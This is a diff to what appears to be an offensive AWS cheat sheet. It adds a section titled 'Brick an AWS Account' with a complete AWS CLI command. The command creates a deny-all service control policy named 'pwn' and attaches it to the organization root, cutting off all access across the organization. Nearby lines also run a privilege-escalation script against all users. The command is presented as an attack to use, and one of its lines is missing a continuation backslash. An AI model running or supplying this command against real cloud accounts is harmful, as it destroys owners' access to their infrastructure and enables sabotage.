@@ -85,6 +85,21 @@ chmod +x aws_escalate.py
 ./aws_escalate.py --all-users
 ```
 
+## Organizations
+
+#### Brick an AWS Account
+
+```text
+aws organizations attach-policy \
+  --policy-id $(aws organizations create-policy --name pwn \
+     --type SERVICE_CONTROL_POLICY \
+     --description "pwn" 
+     --content '{"Version": "2012-10-17","Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]}' \
+    | jq ".Policy.PolicySummary.Id"\
+    ) \
+  --target-id $(aws organizations list-roots | jq ".Roots | .[0].Id")
+```
+
 ## SSM
 
 ### List AWS SSM Parameter Types in use
